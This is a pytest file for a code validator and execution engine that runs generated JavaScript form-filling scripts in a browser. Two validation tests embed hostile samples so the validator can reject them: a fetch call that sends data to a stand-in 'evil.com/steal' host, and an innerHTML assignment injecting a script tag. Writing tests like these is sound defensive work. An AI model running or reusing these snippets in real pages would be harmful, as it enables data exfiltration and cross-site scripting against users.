"""Tests for execution_engine.py - JS validation and execution"""

import pytest
from unittest.mock import AsyncMock, MagicMock
from src.execution_engine import ExecutionEngine
from src.browser import BrowserManager


def test_validate_safe_code(valid_js_code):
    """Test validation accepts safe code"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    is_valid, error = engine.validate_code(valid_js_code)

    assert is_valid is True
    assert error is None


def test_validate_dangerous_eval(dangerous_js_code):
    """Test validation rejects eval()"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    is_valid, error = engine.validate_code(dangerous_js_code)

    assert is_valid is False
    assert "eval" in error.lower()


def test_validate_dangerous_fetch():
    """Test validation rejects fetch()"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = """
    async function fillForm() {
      await fetch('http://evil.com/steal');
      await fillField('#email', 'test@example.com');
    }
    """

    is_valid, error = engine.validate_code(code)

    assert is_valid is False
    assert "fetch" in error.lower()


def test_validate_dangerous_innerhtml():
    """Test validation rejects innerHTML assignment"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = """
    async function fillForm() {
      document.body.innerHTML = '<script>alert("xss")</script>';
    }
    """

    is_valid, error = engine.validate_code(code)

    assert is_valid is False
    assert "innerhtml" in error.lower()


def test_validate_missing_function_structure():
    """Test validation rejects code without fillForm function"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = "await fillField('#email', 'test@example.com');"

    is_valid, error = engine.validate_code(code)

    assert is_valid is False
    assert "fillForm" in error


def test_validate_code_too_long():
    """Test validation rejects overly long code"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = "async function fillForm() {\n" + "  await fillField('#test', 'value');\n" * 1000 + "}"

    is_valid, error = engine.validate_code(code)

    assert is_valid is False
    assert "length" in error.lower()


def test_validate_unauthorized_function():
    """Test validation rejects unauthorized function calls"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = """
    async function fillForm() {
      unauthorizedFunction();
      await fillField('#email', 'test@example.com');
    }
    """

    is_valid, error = engine.validate_code(code)

    assert is_valid is False
    assert "unauthorized" in error.lower()


@pytest.mark.asyncio
async def test_inject_api_functions():
    """Test API functions are injected into page using expose_function"""
    browser = MagicMock()
    browser.page.expose_function = AsyncMock()

    engine = ExecutionEngine(browser)

    await engine.inject_api_functions()

    # Verify expose_function was called for each helper function
    assert browser.page.expose_function.call_count == 5

    # Verify all required functions were exposed
    call_names = [call[0][0] for call in browser.page.expose_function.call_args_list]
    assert "fillField" in call_names
    assert "clickButton" in call_names
    assert "selectOption" in call_names
    assert "checkCheckbox" in call_names
    assert "waitForElement" in call_names


@pytest.mark.asyncio
async def test_execute_success():
    """Test successful code execution"""
    browser = MagicMock()
    browser.page.evaluate = AsyncMock()

    engine = ExecutionEngine(browser)

    code = "async function fillForm() { await fillField('#email', 'test@example.com'); }"
    result = await engine.execute(code)

    assert result["success"] is True
    assert result["error"] is None
    assert "execution_time" in result
    assert len(result["steps"]) == 1
    assert result["steps"][0]["action"] == "fillField"


@pytest.mark.asyncio
async def test_execute_failure():
    """Test code execution failure when element not found"""
    browser = MagicMock()
    browser.page.evaluate = AsyncMock(side_effect=Exception("Element not found: #email"))

    engine = ExecutionEngine(browser)

    code = "async function fillForm() { await fillField('#email', 'test@example.com'); }"
    result = await engine.execute(code)

    assert result["success"] is False
    assert result["error"] is not None
    assert "not found" in result["error"]["message"].lower()


@pytest.mark.asyncio
async def test_execute_exception():
    """Test code execution with exception"""
    browser = MagicMock()
    browser.page.evaluate = AsyncMock(side_effect=Exception("Page crashed"))

    engine = ExecutionEngine(browser)

    code = "async function fillForm() { await fillField('#email', 'test@example.com'); }"
    result = await engine.execute(code)

    assert result["success"] is False
    assert result["error"] is not None
    assert "page crashed" in result["error"]["message"].lower()


@pytest.mark.asyncio
async def test_execute_no_operations():
    """Test execution with no parseable operations"""
    browser = MagicMock()

    engine = ExecutionEngine(browser)

    code = "async function fillForm() { console.log('nothing'); }"
    result = await engine.execute(code)

    assert result["success"] is False
    assert "No valid operations" in result["error"]["message"]


def test_parse_operations_fillfield():
    """Test parsing fillField operations"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = """async function fillForm() {
        await fillField('#email', 'test@example.com');
        await fillField('#password', 'secret123');
    }"""

    ops = engine._parse_operations(code)

    assert len(ops) == 2
    assert ops[0]["type"] == "fillField"
    assert ops[0]["selector"] == "#email"
    assert ops[0]["value"] == "test@example.com"


def test_parse_operations_multiple_types():
    """Test parsing multiple operation types"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = """async function fillForm() {
        await fillField('#email', 'test@example.com');
        await selectOption('#state', 'TX');
        await checkCheckbox('#terms', true);
        await clickButton('button[type="submit"]');
    }"""

    ops = engine._parse_operations(code)

    assert len(ops) == 4
    assert ops[0]["type"] == "fillField"
    assert ops[1]["type"] == "selectOption"
    assert ops[1]["value"] == "TX"
    assert ops[2]["type"] == "checkCheckbox"
    assert ops[2]["checked"] is True
    assert ops[3]["type"] == "clickButton"


def test_extract_submit_click():
    """Test extracting submit button click from generated code"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = """async function fillForm() {
    await fillField('#email', 'test@example.com');
    await fillField('#password', 'pass123');
    await clickButton('button[type="submit"]');
}"""

    modified_code, selector = engine.extract_submit_click(code)

    assert selector == 'button[type="submit"]'
    assert "clickButton" not in modified_code
    assert "fillField" in modified_code


def test_extract_submit_click_no_button():
    """Test extracting when there's no submit button"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = """async function fillForm() {
    await fillField('#email', 'test@example.com');
    await fillField('#password', 'pass123');
}"""

    modified_code, selector = engine.extract_submit_click(code)

    assert selector is None
    assert modified_code == code


def test_extract_submit_click_multiple_buttons():
    """Test extracting last clickButton when there are multiple"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = """async function fillForm() {
    await clickButton('#open-modal');
    await fillField('#email', 'test@example.com');
    await clickButton('button[type="submit"]');
}"""

    modified_code, selector = engine.extract_submit_click(code)

    # Should extract the LAST clickButton call
    assert selector == 'button[type="submit"]'
    assert modified_code.count("clickButton") == 1
    assert "clickButton('#open-modal')" in modified_code
    assert "clickButton('button[type=\"submit\"]')" not in modified_code


def test_parse_operations_selectradio():
    """Test parsing selectRadio operations"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = """async function fillForm() {
        await selectRadio('plan', 'premium');
        await selectRadio('payment_method', 'credit_card');
    }"""

    ops = engine._parse_operations(code)

    assert len(ops) == 2
    assert ops[0]["type"] == "selectRadio"
    assert ops[0]["name"] == "plan"
    assert ops[0]["value"] == "premium"
    assert ops[1]["type"] == "selectRadio"
    assert ops[1]["name"] == "payment_method"
    assert ops[1]["value"] == "credit_card"


def test_validate_code_with_selectradio():
    """Test validation accepts code with selectRadio"""
    browser = MagicMock()
    engine = ExecutionEngine(browser)

    code = """async function fillForm() {
        await selectRadio('plan', 'basic');
        await fillField('#email', 'test@example.com');
    }"""

    is_valid, error = engine.validate_code(code)

    assert is_valid is True
    assert error is None


@pytest.mark.asyncio
async def test_execute_selectradio():
    """Test successful selectRadio execution"""
    browser = MagicMock()
    browser.page.evaluate = AsyncMock()

    engine = ExecutionEngine(browser)

    code = """async function fillForm() {
        await selectRadio('plan', 'premium');
    }"""

    result = await engine.execute(code)

    assert result["success"] is True
    assert result["error"] is None
    assert len(result["steps"]) == 1
    assert result["steps"][0]["action"] == "selectRadio"
    assert result["steps"][0]["name"] == "plan"
    assert result["steps"][0]["value"] == "premium"


@pytest.mark.asyncio
async def test_execute_selectradio_not_found():
    """Test selectRadio execution when radio button not found"""
    browser = MagicMock()
    browser.page.evaluate = AsyncMock(
        side_effect=Exception('Radio button not found: name="plan" value="invalid"')
    )

    engine = ExecutionEngine(browser)

    code = """async function fillForm() {
        await selectRadio('plan', 'invalid');
    }"""

    result = await engine.execute(code)

    assert result["success"] is False
    assert result["error"] is not None
    assert "not found" in result["error"]["message"].lower()